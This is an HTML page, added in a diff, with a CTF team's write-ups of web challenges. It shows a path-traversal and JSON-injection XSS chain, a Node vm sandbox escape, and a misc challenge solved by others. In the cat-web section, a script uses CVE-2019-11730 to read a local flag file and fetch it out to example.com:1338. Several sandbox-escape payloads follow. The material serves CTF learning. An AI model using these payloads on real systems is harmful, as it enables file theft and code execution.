@@ -1,0 +1,355 @@
+<!DOCTYPE HTML>
+<!-- This page is modified from the template https://www.codeply.com/go/7XYosZ7VH5 by Carol Skelly (@iatek). -->
+<html>
+  <head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+    <title>Web</title>
+    <link type="text/css" rel="stylesheet" href="../assets/css/github-markdown.css">
+    <link type="text/css" rel="stylesheet" href="../assets/css/pilcrow.css">
+    <link type="text/css" rel="stylesheet" href="../assets/css/hljs-github.min.css"/>
+    <link type="text/css" rel="stylesheet" href="../assets/css/bootstrap-4.0.0-beta.3.min.css">
+    <script type="text/javascript" src="../assets/js/jquery-3.3.1.slim.min.js"></script>
+    <script type="text/javascript" src="../assets/js/bootstrap-4.0.0-beta.3.min.js"></script>
+    <script type="text/javascript" src="../assets/js/popper-1.14.3.min.js"></script>
+    <script type="text/javascript" src="../assets/js/mathjax-2.7.4/MathJax.js?config=TeX-MML-AM_CHTML"></script>
+  </head>
+  <style>
+  body {
+      padding-top: 56px;
+  }
+
+  .sticky-offset {
+      top: 56px;
+  }
+
+  #body-row {
+      margin-left:0;
+      margin-right:0;
+  }
+  #sidebar-container {
+      min-height: 100vh;   
+      background-color: #333;
+      padding: 0;
+  }
+
+  /* Sidebar sizes when expanded and expanded */
+  .sidebar-expanded {
+      width: 230px;
+  }
+  .sidebar-collapsed {
+      width: 60px;
+  }
+
+  /* Menu item*/
+  #sidebar-container .list-group a {
+      height: 50px;
+      color: white;
+  }
+
+  /* Submenu item*/
+  #sidebar-container .list-group .sidebar-submenu a {
+      height: 45px;
+      padding-left: 60px;
+  }
+  .sidebar-submenu {
+      font-size: 0.9rem;
+  }
+
+  /* Separators */
+  .sidebar-separator-title {
+      background-color: #333;
+      height: 35px;
+  }
+  .sidebar-separator {
+      background-color: #333;
+      height: 25px;
+  }
+  .logo-separator {
+      background-color: #333;    
+      height: 60px;
+  }
+
+
+  /* 
+   active scrollspy
+  */
+  .list-group-item.active {
+    border-color: transparent;
+    border-left: #e69138 solid 4px;
+  }
+
+  /* 
+   anchor padding top
+   https://stackoverflow.com/a/28824157
+  */
+  :target:before {
+    content:"";
+    display:block;
+    height:56px; /* fixed header height*/
+    margin:-56px 0 0; /* negative fixed header height */
+  }
+  </style>
+  
+  <script>
+  // https://stackoverflow.com/a/48330533
+  $(window).on('activate.bs.scrollspy', function (event) {
+    let active_collapse = $($('.list-group-item.active').parents()[0]);
+    $(".collapse").removeClass("show");
+    active_collapse.addClass("show");
+
+    let parent_menu = $('a[href="#' + active_collapse[0].id + '"]');
+    $('a[href^="#submenu"]').css("border-left", "");
+    parent_menu.css("border-left","#e69138 solid 4px");
+  });
+
+  // http://docs.mathjax.org/en/latest/tex.html#tex-and-latex-math-delimiters
+  MathJax.Hub.Config({
+    tex2jax: {
+      inlineMath: [['$','$'], ['\\(','\\)']],
+      processEscapes: true
+    }
+  });
+  </script>
+
+  <body style="position: relative;" data-spy="scroll" data-target=".sidebar-submenu" data-offset="70">
+    <nav class="navbar navbar-expand-md navbar-light bg-light fixed-top">
+      <button class="navbar-toggler navbar-toggler-right" type="button" data-toggle="collapse" data-target="#navbarNavDropdown" aria-controls="navbarNavDropdown" aria-expanded="false" aria-label="Toggle navigation">
+        <span class="navbar-toggler-icon"></span>
+      </button>
+      <a class="navbar-brand" href="https://github.com/balsn/ctf_writeup">
+        <img src="https://github.githubassets.com/images/modules/logos_page/GitHub-Mark.png" class="d-inline-block align-top" alt="" width="30" height="30">
+        <span class="menu-collapsed">balsn / ctf_writeup</span>
+      </a>
+      <div class="collapse navbar-collapse" id="navbarNavDropdown">
+        <ul class="navbar-nav my-2 my-lg-0">
+            
+            <li class="nav-item dropdown d-sm-block d-md-none">
+              <iframe src="https://ghbtns.com/github-btn.html?user=balsn&repo=ctf_writeup&type=watch&count=true&size=large&v=2" frameborder="0" scrolling="0" width="140px" height="30px"></iframe>
+              <iframe src="https://ghbtns.com/github-btn.html?user=balsn&repo=ctf_writeup&type=star&count=true&size=large" frameborder="0" scrolling="0" width="140px" height="30px"></iframe>
+        
+              <a class="nav-link dropdown-toggle" href="#" data-toggle="dropdown" aria-haspopup="true" aria-expanded="false">
+                web
+              </a>
+              <div class="dropdown-menu" aria-labelledby="smallerscreenmenu">
+                                <a class="dropdown-item" href="#cat-web">cat-web</a>
+    
+                <a class="dropdown-item" href="#temple-js-(unsolved)">temple-js-(unsolved)</a>
+    
+              </div>
+            </li>
+    
+            <li class="nav-item dropdown d-sm-block d-md-none">
+              <a class="nav-link dropdown-toggle" href="#" data-toggle="dropdown" aria-haspopup="true" aria-expanded="false">
+                misc
+              </a>
+              <div class="dropdown-menu" aria-labelledby="smallerscreenmenu">
+                                <a class="dropdown-item" href="#angry-defender-(unsolved)">angry-defender-(unsolved)</a>
+    
+              </div>
+            </li>
+    
+        </ul>
+      </div>
+      <div class="navbar-collapse collapse w-100 order-3 dual-collapse2">
+        <ul class="navbar-nav ml-auto">
+          <iframe src="https://ghbtns.com/github-btn.html?user=balsn&repo=ctf_writeup&type=watch&count=true&size=large&v=2" frameborder="0" scrolling="0" width="160px" height="30px"></iframe>
+          <iframe src="https://ghbtns.com/github-btn.html?user=balsn&repo=ctf_writeup&type=star&count=true&size=large" frameborder="0" scrolling="0" width="160px" height="30px"></iframe>
+        </ul>
+      </div>
+    </nav>
+    <div class="row" id="body-row">
+      <div id="sidebar-container" class="sidebar-expanded d-none d-md-block col-2">
+        <ul class="list-group sticky-top sticky-offset">
+          
+          <a href="#submenu0" data-toggle="collapse" aria-expanded="false" class="list-group-item list-group-item-action flex-column align-items-start bg-dark">
+            <div class="d-flex w-100 justify-content-start align-items-center font-weight-bold">
+              <span class="fa fa-dashboard fa-fw mr-3"></span>
+              <span class="menu-collapsed">web</span>
+              <span class="submenu-icon ml-auto"></span>
+            </div>
+          </a>
+          <div id="submenu0" class="collapse sidebar-submenu">
+            <a href="#cat-web" class="list-group-item list-group-item-action text-white bg-dark">
+              <span class="menu-collapsed">cat-web</span>
+            </a>
+    
+<a href="#temple-js-(unsolved)" class="list-group-item list-group-item-action text-white bg-dark">
+              <span class="menu-collapsed">temple-js-(unsolved)</span>
+            </a>
+    
+          </div>
+    
+          <a href="#submenu1" data-toggle="collapse" aria-expanded="false" class="list-group-item list-group-item-action flex-column align-items-start bg-dark">
+            <div class="d-flex w-100 justify-content-start align-items-center font-weight-bold">
+              <span class="fa fa-dashboard fa-fw mr-3"></span>
+              <span class="menu-collapsed">misc</span>
+              <span class="submenu-icon ml-auto"></span>
+            </div>
+          </a>
+          <div id="submenu1" class="collapse sidebar-submenu">
+            <a href="#angry-defender-(unsolved)" class="list-group-item list-group-item-action text-white bg-dark">
+              <span class="menu-collapsed">angry-defender-(unsolved)</span>
+            </a>
+    
+          </div>
+    
+        </ul>
+      </div>
+      <div class="col-10 py-3">
+        <article class="markdown-body"><h2 id="web"><a class="header-link" href="#web"></a>Web</h2>
+<h3 id="cat-web"><a class="header-link" href="#cat-web"></a>cat web</h3>
+<p>The server uses AJAX APIs to render the website content. The API endpoint is like this:</p>
+<pre class="hljs"><code>/cats?<span class="hljs-attr">kind=black</span>
+
+{<span class="hljs-string">"status"</span>: <span class="hljs-string">"ok"</span>, <span class="hljs-string">"content"</span>: [<span class="hljs-string">"il_570xN.1285759626_8j8m.jpg"</span>, <span class="hljs-string">"24.jpg"</span>, <span class="hljs-string">"2468b5d0-67e8-4d77-9bbb-87a656c8087a-large3x4_Untitledcollage.jpg"</span>]}</code></pre><p>Let&#39;s quickly fuzz a little bit:</p>
+<pre class="hljs"><code><span class="hljs-regexp">/cats?kind=black/</span>..<span class="hljs-regexp">/../</span>
+
+{<span class="hljs-string">"status"</span>: <span class="hljs-string">"ok"</span>, <span class="hljs-string">"content"</span>: [<span class="hljs-string">"prestart.sh"</span>, <span class="hljs-string">"uwsgi.ini"</span>, <span class="hljs-string">"main.py"</span>, <span class="hljs-string">"templates"</span>, <span class="hljs-string">"static"</span>, <span class="hljs-string">"app.py"</span>]}
+
+
+<span class="hljs-regexp">/cats?kind=black/</span>..<span class="hljs-regexp">/../</span>templates
+
+{<span class="hljs-string">"status"</span>: <span class="hljs-string">"ok"</span>, <span class="hljs-string">"content"</span>: [<span class="hljs-string">"report.html"</span>, <span class="hljs-string">"index.html"</span>, <span class="hljs-string">"flag.txt"</span>]}</code></pre><p>So the flag.txt is in the <code>templates</code> directory. Also, the response contains <code>access-control-allow-origin: *</code> which allows cross-origin read.</p>
+<p>Next, there is a XSS bot on the index page. We have to find a XSS point. The <code>/cats?kind=</code> API will return the raw error message in JSON without encoding the HTML.</p>
+<pre class="hljs"><code>http://catweb.zajebistyc.<span class="hljs-keyword">tf</span>/cats?kind=<span class="hljs-symbol">&lt;h1&gt;</span><span class="hljs-keyword">hi</span>&lt;/h1&gt;
+
+{<span class="hljs-string">"status"</span>: <span class="hljs-string">"error"</span>, <span class="hljs-string">"content"</span>: <span class="hljs-string">"&lt;h1&gt;h1&lt;/h1&gt; could not be found"</span>}</code></pre><p>However, the <code>content-type</code> header is <code>application/json</code>. We can&#39;t do much here. Instead we have to take advantages of the AJAX in the index page</p>
+<pre class="hljs"><code><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">getNewCats</span>(<span class="hljs-params">kind</span>) </span>{                                                     
+  $.getJSON(<span class="hljs-string">'http://catweb.zajebistyc.tf/cats?kind='</span>+kind, <span class="hljs-function"><span class="hljs-keyword">function</span>(<span class="hljs-params">data</span>) </span>{
+      <span class="hljs-keyword">if</span>(data.status != <span class="hljs-string">'ok'</span>)
+      { 
+      <span class="hljs-keyword">return</span>;
+      } 
+      $(<span class="hljs-string">'#cats_container'</span>).empty();
+      cats = data.content;
+      cats.forEach(<span class="hljs-function"><span class="hljs-keyword">function</span>(<span class="hljs-params">cat</span>) </span>{
+        <span class="hljs-keyword">var</span> newDiv = <span class="hljs-built_in">document</span>.createElement(<span class="hljs-string">'div'</span>);
+        newDiv.innerHTML = <span class="hljs-string">'&lt;img style="max-width: 200px; max-height: 200px" src="static/'</span>+kind+<span class="hljs-string">'/'</span>+cat+<span class="hljs-string">'" /&gt;'</span>;
+        $(<span class="hljs-string">'#cats_container'</span>).append(newDiv);
+        }); 
+      }); 
+
+}
+
+$(<span class="hljs-built_in">document</span>).ready(<span class="hljs-function"><span class="hljs-keyword">function</span>(<span class="hljs-params"></span>) </span>{
+    $(<span class="hljs-string">'#cat_select'</span>).change(<span class="hljs-function"><span class="hljs-keyword">function</span>(<span class="hljs-params"></span>) </span>{
+        <span class="hljs-keyword">var</span> kind = $(<span class="hljs-keyword">this</span>).val();
+        history.pushState({}, <span class="hljs-string">''</span>, <span class="hljs-string">'?'</span>+kind)
+        getNewCats(kind);
+        });
+    <span class="hljs-keyword">var</span> kind = <span class="hljs-built_in">window</span>.location.search.substring(<span class="hljs-number">1</span>);
+    <span class="hljs-keyword">if</span>(kind == <span class="hljs-string">""</span>)
+    {
+    kind = <span class="hljs-string">'black'</span>;
+    }
+    getNewCats(kind);
+});</code></pre><p>By overwriting the JSON <code>status</code> and using <code>\u0022</code> to encode the <code>&quot;</code>, we can trigger a XSS.</p>
+<pre class="hljs"><code>/?foo<span class="hljs-string">","c</span>ontent<span class="hljs-string">":["</span>\u0022&gt;&lt;img src=x onerror=alert(<span class="hljs-number">1</span>)&gt;<span class="hljs-string">"],"</span>status<span class="hljs-string">":"</span>ok<span class="hljs-string">","</span>ba<span class="hljs-string">r":"</span></code></pre><p>We have a XSS now, but how do we read the flag?</p>
+<p>The idea is to abuse <code>file:///</code> and XSS to extract the flag.</p>
+<p>The UA of XSS bot is <code>Mozilla/5.0 (X11; Linux x86_64; rv:67.0) Gecko/20100101 Firefox/67.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8</code>.</p>
+<p>That&#39;s a rather old Firefox. We start to search for CVE and security fix and got this <a href="https://www.mozilla.org/en-US/security/advisories/mfsa2019-21/#CVE-2019-11730">CVE-2019-11730: Same-origin policy treats all files in a directory as having the same-origin</a>.</p>
+<p>The rest is straightforward. In firefox 67 the files in the directory <code>/app/templates/</code> are all considered as same-origin. We can utilize XSS on <code>file://</code> to retrieve the flag.</p>
+<p>Report this url:</p>
+<pre class="hljs"><code><span class="hljs-link">file:///app/templates/index.html?foo","content":</span>[<span class="hljs-string">"\u0022&gt;&lt;script src=http://example.com:1338/xs.js&gt;&lt;/script&gt;"</span>],"status":"ok","bar":"</code></pre><p>xs.js:</p>
+<pre class="hljs"><code>url=<span class="hljs-string">'http://example.com:1338/?'</span>
+fetch(<span class="hljs-string">'file:///app/templates/flag.txt'</span>).then(<span class="hljs-function"><span class="hljs-params">r</span>=&gt;</span>r.text()).then(<span class="hljs-function"><span class="hljs-params">t</span>=&gt;</span>fetch(url+btoa(t)));</code></pre><p>The flag is <code>p4{can_i_haz_a_piece_of_flag_pliz?}</code>.</p>
+<p>This is a great challenge! Really enjoy it :)</p>
+<h4 id="failed-attempts"><a class="header-link" href="#failed-attempts"></a>Failed Attempts</h4>
+<ul class="list">
+<li>XSS through localhost to RCE via Flask debug page: However the Flask debug is not enabled on localhost, and Flask console is protected by PIN.</li>
+</ul>
+<h3 id="temple-js-(unsolved)"><a class="header-link" href="#temple-js-(unsolved)"></a>Temple JS (unsolved)</h3>
+<blockquote>
+<p>Written by bookgin</p>
+</blockquote>
+<p>The server code:</p>
+<pre class="hljs"><code><span class="hljs-keyword">const</span> express = <span class="hljs-built_in">require</span>(<span class="hljs-string">"express"</span>)
+<span class="hljs-keyword">const</span> fs = <span class="hljs-built_in">require</span>(<span class="hljs-string">"fs"</span>)
+<span class="hljs-keyword">const</span> vm = <span class="hljs-built_in">require</span>(<span class="hljs-string">"vm"</span>)
+<span class="hljs-keyword">const</span> watchdog = <span class="hljs-built_in">require</span>(<span class="hljs-string">"./watchdog"</span>);
+
+global.flag = fs.readFileSync(<span class="hljs-string">"flag"</span>).toString()
+<span class="hljs-keyword">const</span> source = fs.readFileSync(__filename).toString()
+<span class="hljs-keyword">const</span> help = <span class="hljs-string">"There is no help on the way."</span>
+
+<span class="hljs-keyword">const</span> app = express()
+<span class="hljs-keyword">const</span> port = <span class="hljs-number">3000</span>
+
+app.use(express.json())
+app.use(<span class="hljs-string">'/'</span>, express.static(<span class="hljs-string">'public'</span>))
+
+app.post(<span class="hljs-string">'/repl'</span>, (req, res) =&gt; {
+    <span class="hljs-keyword">let</span> sandbox = vm.createContext({<span class="hljs-attr">par</span>: (<span class="hljs-function"><span class="hljs-params">v</span> =&gt;</span> <span class="hljs-string">`(<span class="hljs-subst">${v}</span>)`</span>), source, help})
+    <span class="hljs-keyword">let</span> validInput = <span class="hljs-regexp">/^[a-zA-Z0-9 ${}`]+$/g</span>
+
+    <span class="hljs-keyword">let</span> command = req.body[<span class="hljs-string">'cmd'</span>]
+
+    <span class="hljs-built_in">console</span>.log(<span class="hljs-string">`<span class="hljs-subst">${req.ip}</span>&gt; <span class="hljs-subst">${command}</span>`</span>)
+
+    <span class="hljs-keyword">let</span> response;
+
+    <span class="hljs-keyword">try</span> {
+        <span class="hljs-keyword">if</span>(validInput.test(command))
+        {    
+            <span class="hljs-keyword">let</span> watch = watchdog.schedule()
+            <span class="hljs-keyword">try</span> {
+                response = vm.runInContext(command, sandbox, {
+                    <span class="hljs-attr">timeout</span>: <span class="hljs-number">300</span>,
+                    <span class="hljs-attr">displayErrors</span>: <span class="hljs-literal">false</span>
+                });
+            } <span class="hljs-keyword">finally</span> {
+                watchdog.stop(watch)
+            }
+        } <span class="hljs-keyword">else</span>
+            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-built_in">Error</span>(<span class="hljs-string">"Invalid input."</span>)
+    } <span class="hljs-keyword">catch</span>(ex)
+    {
+        response = ex.toString()
+    }
+
+    <span class="hljs-built_in">console</span>.log(<span class="hljs-string">`<span class="hljs-subst">${req.ip}</span>&lt; <span class="hljs-subst">${response}</span>`</span>)
+    res.send(<span class="hljs-built_in">JSON</span>.stringify({<span class="hljs-string">"response"</span>: response}))
+})
+
+<span class="hljs-built_in">console</span>.log(<span class="hljs-string">`Listening on :<span class="hljs-subst">${port}</span>...`</span>)
+app.listen(port, <span class="hljs-string">'0.0.0.0'</span>)</code></pre><p>Basically we need to read <code>flag</code> in the sandbox with limited characters.</p>
+<p>To escape the sandbox, we follow <a href="https://pwnisher.gitlab.io/nodejs/sandbox/2019/02/21/sandboxing-nodejs-is-hard.html">this article</a> to access the object outside of the sandbox.</p>
+<pre class="hljs"><code><span class="hljs-function"><span class="hljs-keyword">constructor</span>.<span class="hljs-title">constructor</span><span class="hljs-params">(<span class="hljs-string">'return flag'</span>)</span><span class="hljs-params">()</span></span></code></pre><p>However, <code>.</code> is not allowed. We need to either create <code>.</code> based on those limited chracters, or use other syntax to access the attributes.</p>
+<p>First, we will need <code>eval()</code> to create <code>.</code>. In javascript we can use <code>Function</code> to achieve eval:</p>
+<pre class="hljs"><code># eval
+&gt; Function`return <span class="hljs-number">123</span>``foo`
+<span class="hljs-number">123</span>
+
+# double evaluation
+&gt; Function` foo${`return ${<span class="hljs-number">1</span>+<span class="hljs-number">1</span>}`}`` `
+<span class="hljs-number">2</span></code></pre><p>However, in the end I didn&#39;t manage to solve this challenge because I&#39;m a javascript noob.......</p>
+<p>Here are some creative solutions:</p>
+<ol class="list">
+<li>Destruct by @sasdf:</li>
+</ol>
+<pre class="hljs"><code>Function`a${`return constructor`}{constructor}` `${constructor}` `return flag` ``</code></pre><p>This one didn&#39;t even use the helper function <code>par</code>. Always amazed by our member @sasdf !</p>
+<ol start="2">
+<li>for-loop dot creation by @qweqwe:<pre class="hljs"><code>{var dot} {Function`x ${`for ${par`dot <span class="hljs-keyword">of</span> help`} { } return dot`}` ``} {Function`x ${`return constructor${dot}constructor`}` `` `return flag` ``}</code></pre></li>
+</ol>
+<p>It uses <code>for (dot of help) { } return dot</code> to create <code>.</code>.</p>
+<ol start="3">
+<li><code>with()</code> by @toob:</li>
+</ol>
+<pre class="hljs"><code>Function`a${`<span class="hljs-keyword">with</span> ${par`par`} return constructor`}` `` `return flag` ``</code></pre><p>Actually I was closed to this one, but I found <code>with</code> could be useful in the last 20 minutes of the CTF......</p>
+<h2 id="misc"><a class="header-link" href="#misc"></a>Misc</h2>
+<h3 id="angry-defender-(unsolved)"><a class="header-link" href="#angry-defender-(unsolved)"></a>Angry Defender (unsolved)</h3>
+<p>This is based on @t0nk42 (icchy)&#39;s <a href="https://speakerdeck.com/icchy/lets-make-windows-defender-angry-antivirus-can-be-an-oracle">research on Windows Defender</a>. Alexei Bulazel also did <a href="https://i.blackhat.com/us-18/Thu-August-9/us-18-Bulazel-Windows-Offender-Reverse-Engineering-Windows-Defenders-Antivirus-Emulator.pdf">some research on the emulator</a>.</p>
+<p>Because in this challenge the flag is directly appended into the files, without the close tag <code>&lt;/body&gt;</code> it seems not possible to extract the content with JavaScript. See my <a href="https://balsn.tw/ctf_writeup/20190831-tokyowesternsctf/#exploit">write-up</a> for more details.</p>
+<p>The hint indicates this but we&#39;re still trying to use javascript and other Interpreted language (php) to extract the flag. PHP seems promising but we can&#39;t construct a valid payload. The intended solution is to utilize Windows binary file.</p>
+<p>For write-ups by other teams please see:</p>
+<ul class="list">
+<li><a href="https://ctftime.org/writeup/18774">Write-up by Bushwhackers</a></li>
+<li><a href="https://github.com/junorouse/ctf/blob/master/2020/confidence-pre/angry-defender.md">Write-up by @junorouse</a></li>
+</ul>
+        </article>
+      </div>
+    </div>
+  </body>
+</html>
